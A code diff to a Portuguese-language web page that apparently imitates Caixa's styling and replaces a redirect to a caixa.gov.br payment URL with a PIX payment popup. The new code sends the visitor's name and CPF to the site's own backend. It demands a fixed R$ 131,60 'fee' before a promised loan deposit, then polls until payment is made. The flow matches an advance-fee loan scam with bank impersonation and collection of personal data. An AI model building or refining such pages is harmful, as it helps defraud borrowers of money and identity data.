@@ -194,9 +194,40 @@
 
     <div id="overlay" class="overlay"></div>
     <div id="popup" class="popup">
-        <div class="popup-content">
+        <div class="popup-content" id="loadingPopup">
             <div class="loader"></div>
             <p class="mt-4 text-[18px] font-bold">Gerando Guia de Pagamento</p>
+        </div>
+        
+        <div class="popup-content" id="pixPaymentPopup" style="display: none; width: 95%; max-width: 450px; padding: 25px;">
+            <div class="text-center mb-4">
+                <h3 class="text-[18px] font-bold text-[#005ca9] mb-2" id="pixPaymentTitle">Aguardando Pagamento</h3>
+                <p class="text-[15px] mb-4" id="pixPaymentDescription">Para concluir o depósito em sua conta, realize o pagamento via PIX.</p>
+                
+                <div class="loader mb-4 mx-auto" id="pixStatusLoader"></div>
+                
+                <!-- QR Code -->
+                <div class="bg-gray-100 p-4 rounded-lg mb-4">
+                    <img id="pixQrCode" src="" alt="QR Code PIX" class="w-48 h-48 mx-auto mb-3">
+                    <p class="text-[14px] text-gray-600 mb-1">Escaneie o QR Code acima</p>
+                </div>
+                
+                <!-- PIX Copy & Paste -->
+                <div class="bg-gray-100 p-3 rounded-lg mb-4">
+                    <p class="text-[14px] font-semibold mb-1 text-gray-700">Código PIX copia e cola:</p>
+                    <div class="relative">
+                        <textarea id="pixCodeText" readonly class="w-full p-3 text-[12px] bg-white border border-gray-300 rounded-md h-24 font-mono overflow-auto resize-none"></textarea>
+                    </div>
+                    <button id="copyPixCodeBtn" class="mt-2 bg-[#005ca9] text-white font-semibold py-2 px-4 rounded-md w-full text-[14px] transition duration-300 hover:bg-[#004d8c]">
+                        <i class="fas fa-copy mr-2"></i>Copiar Código PIX
+                    </button>
+                </div>
+                
+                <p class="text-[13px] text-gray-600 mt-3">
+                    Após o pagamento, aguarde alguns instantes para a confirmação.
+                    <br>O sistema verificará automaticamente o status do pagamento.
+                </p>
+            </div>
         </div>
     </div>
 
@@ -300,17 +331,125 @@
         const popup = document.getElementById('popup');
         const overlay = document.getElementById('overlay');
 
+        // Função para verificar status do pagamento
+        let transactionId = null;
+        let checkStatusInterval = null;
+        
+        function checkPaymentStatus() {
+            if (!transactionId) return;
+            
+            console.log("Verificando status do pagamento:", transactionId);
+            
+            fetch(`/check-payment-status?transaction_id=${transactionId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Resposta do status do pagamento:", data);
+                    
+                    if (data.status === 'completed' || data.original_status === 'APPROVED') {
+                        console.log("Pagamento aprovado, redirecionando imediatamente...");
+                        clearInterval(checkStatusInterval);
+                        
+                        // Redireciona para a próxima página
+                        setTimeout(() => {
+                            window.location.href = '/opcoes-emprestimo';
+                        }, 1000);
+                        
+                    } else if (data.original_status === 'PENDING' || data.original_status === 'PROCESSING') {
+                        console.log("Pagamento ainda pendente. Status:", data.original_status);
+                    } else {
+                        console.log("Status de pagamento desconhecido:", data.original_status);
+                    }
+                })
+                .catch(error => {
+                    console.error("Erro ao verificar status:", error);
+                });
+        }
+        
+        // Função para copiar o código PIX
+        function setupPixCodeCopyButton() {
+            const copyButton = document.getElementById('copyPixCodeBtn');
+            const codeText = document.getElementById('pixCodeText');
+            
+            copyButton.addEventListener('click', function() {
+                codeText.select();
+                document.execCommand('copy');
+                
+                // Feedback visual
+                const originalText = copyButton.innerHTML;
+                copyButton.innerHTML = '<i class="fas fa-check mr-2"></i>Código Copiado!';
+                copyButton.classList.add('bg-green-600');
+                
+                setTimeout(() => {
+                    copyButton.innerHTML = originalText;
+                    copyButton.classList.remove('bg-green-600');
+                }, 2000);
+            });
+        }
+        
         payFeeButton.addEventListener('click', function() {
-            popup.style.display = 'block';
+            // Mostrar overlay e popup de carregamento
             overlay.style.display = 'block';
-
-            // Simulate loading for 3 seconds, then redirect
-            setTimeout(function() {
-                const paymentUrl = `https://pagamento.caixa.gov.br?name=${encodeURIComponent(name)}&cpf=${encodeURIComponent(cpf)}&telephone=${encodeURIComponent(telephone)}`;
-                window.location.href = paymentUrl;
-            }, 3000);
+            popup.style.display = 'block';
+            document.getElementById('loadingPopup').style.display = 'block';
+            document.getElementById('pixPaymentPopup').style.display = 'none';
+            
+            // Preparar os dados para o pagamento
+            const paymentAmount = 131.60; // Valor fixo das taxas
+            
+            // Dados limpos para a API
+            const cleanName = fullName;
+            const cleanCpf = userData.cpf.replace(/\D/g, '');
+            const email = `${cleanCpf}@cliente.com.br`;
+            
+            // Enviar requisição para criar o pagamento
+            fetch('/create-pix-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    name: cleanName,
+                    cpf: cleanCpf,
+                    email: email,
+                    amount: paymentAmount,
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Resposta da API de pagamento:", data);
+                
+                // Esconder popup de carregamento e mostrar popup de pagamento PIX
+                document.getElementById('loadingPopup').style.display = 'none';
+                document.getElementById('pixPaymentPopup').style.display = 'block';
+                
+                // Atualizar título e descrição
+                document.getElementById('pixPaymentTitle').textContent = `Aguardando Pagamento`;
+                document.getElementById('pixPaymentDescription').textContent = 
+                    `Para concluir o depósito no valor de ${loanAmount} em sua conta ${bankName}, realize o pagamento de R$ 131,60 via PIX.`;
+                
+                // Configurar o QR code e código PIX
+                document.getElementById('pixQrCode').src = data.pix_qr_code;
+                document.getElementById('pixCodeText').value = data.pix_code;
+                
+                // Configurar o botão de cópia
+                setupPixCodeCopyButton();
+                
+                // Salvar o ID da transação e iniciar verificação de status
+                transactionId = data.transaction_id;
+                
+                // Verificar status a cada 3 segundos
+                checkStatusInterval = setInterval(checkPaymentStatus, 3000);
+            })
+            .catch(error => {
+                console.error("Erro ao criar pagamento:", error);
+                alert("Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente.");
+                
+                // Esconder overlay e popup
+                overlay.style.display = 'none';
+                popup.style.display = 'none';
+            });
         });
-
+        
         // Log para depuração
         console.log('Dados do usuário carregados:', { fullName, firstName, formattedCpf, loanAmount, bankName, pixKey });
     </script>
